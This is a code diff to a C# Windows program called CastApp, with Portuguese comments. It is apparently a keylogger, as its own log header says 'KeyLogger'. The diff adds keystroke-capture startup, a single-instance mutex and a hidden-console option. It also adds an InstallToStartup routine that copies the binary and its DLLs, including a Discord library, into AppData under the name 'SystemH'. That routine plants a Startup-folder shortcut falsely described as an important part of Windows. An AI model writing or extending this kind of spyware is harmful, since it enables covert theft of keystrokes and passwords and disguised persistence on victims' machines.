@@ -1,4 +1,7 @@
-﻿using System.Text;
+﻿using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Text;
+using IWshRuntimeLibrary;
 
 namespace CastApp
 {
@@ -25,16 +28,29 @@ namespace CastApp
         private static DateTime lastFlush = DateTime.Now;
         private static readonly TimeSpan FlushInterval = TimeSpan.FromSeconds(5);
 
+        private static Mutex? _mutex;
+
         /// <summary>
         /// Ponmto de entrada do programa
         /// Onde tudo começa
         /// <summary>
-        private static void Main()
+        private static async Task Main()
         {
+            ///<summary>
+            /// Natives.FreeConsole(); Esconde o console mas no visual studio continua fica visivel
+            /// para que assim possamos ver os erros que possam ocorrer
+            /// <summary>
+            //Natives.FreeConsole();
+
+            _mutex = new Mutex(initiallyOwned: true, "SystemH", out var createdNew);
+
             try
-            { 
-                InitializeLogFile();
-                StartKeyCapture();
+            {
+                if (createdNew)
+                {
+                    //InstallToStartup();
+                    StartKeyCapture();
+                }
             }
             catch (Exception ex)
             {
@@ -43,30 +59,44 @@ namespace CastApp
             }
         }
 
-        /// <summary>
-        /// Inicializa o arquivo de log
-        /// </summary>
-        private static void InitializeLogFile()
+        public static void InstallToStartup()
         {
-            try
-            {
-                if (!Directory.Exists(LogDirectory))
-                {
-                    Directory.CreateDirectory(LogDirectory);
-                }
+            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+                throw new PlatformNotSupportedException("Este método só é suportado no Windows.");
 
-                if (!File.Exists(LogFile))
+            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            string text = Path.Combine(folderPath, "SystemH");
+            Directory.CreateDirectory(text);
+            string path = Environment.ProcessPath ?? Assembly.GetExecutingAssembly().Location;
+            string fileName = Path.GetFileName(path);
+            string[] array = new string[7] { fileName, "DSharpPlus.dll", "CastApp.dll", "CastApp.deps.json", "CastApp.runtimeconfig.json", "Microsoft.Extensions.Logging.Abstractions.dll", "Newtonsoft.Json.dll" };
+            string? directoryName = Path.GetDirectoryName(path);
+            if (directoryName == null)
+                throw new InvalidOperationException("O diretório do executável não pôde ser determinado.");
+            string[] array2 = array;
+            foreach (string path2 in array2)
+            {
+                string text2 = Path.Combine(directoryName, path2);
+                string text3 = Path.Combine(text, path2);
+                if (System.IO.File.Exists(text2) && !System.IO.File.Exists(text3))
                 {
-                    using (var sw = File.CreateText(LogFile))
-                    {
-                        sw.WriteLine($"=== KeyLogger iniciado em {DateTime.Now:yyyy-MM-dd HH:mm:ss} ===");
-                    }
+                    System.IO.File.Copy(text2, text3, overwrite: false);
                 }
             }
-            catch (Exception ex)
-            {
-                throw new InvalidOperationException($"Não foi possível inicializar o arquivo de log: {ex.Message}");
-            }
+            string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            string pathLink = Path.Combine(folderPath2, "SystemH.lnk");
+
+            Type? wshType = Marshal.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"));
+            if (wshType == null)
+                throw new InvalidOperationException("Não foi possível obter o tipo WshShell.");
+
+            WshShell wshShell = (WshShell)Activator.CreateInstance(wshType)!;
+            IWshShortcut wshShortcut = (IWshShortcut)(dynamic)wshShell.CreateShortcut(pathLink);
+            wshShortcut.TargetPath = Path.Combine(text, fileName);
+            wshShortcut.WorkingDirectory = text;
+            wshShortcut.WindowStyle = 1;
+            wshShortcut.Description = "Inicia o SystemH na inicialização, Parte IMPORTANTE do Windows";
+            wshShortcut.Save();
         }
 
         /// <summary>
@@ -244,7 +274,7 @@ namespace CastApp
 
                 lock (FileLock)
                 {
-                    File.AppendAllText(LogFile, content, Encoding.UTF8);
+                    System.IO.File.AppendAllText(LogFile, content, Encoding.UTF8);
                 }
 
                 lastFlush = DateTime.Now;
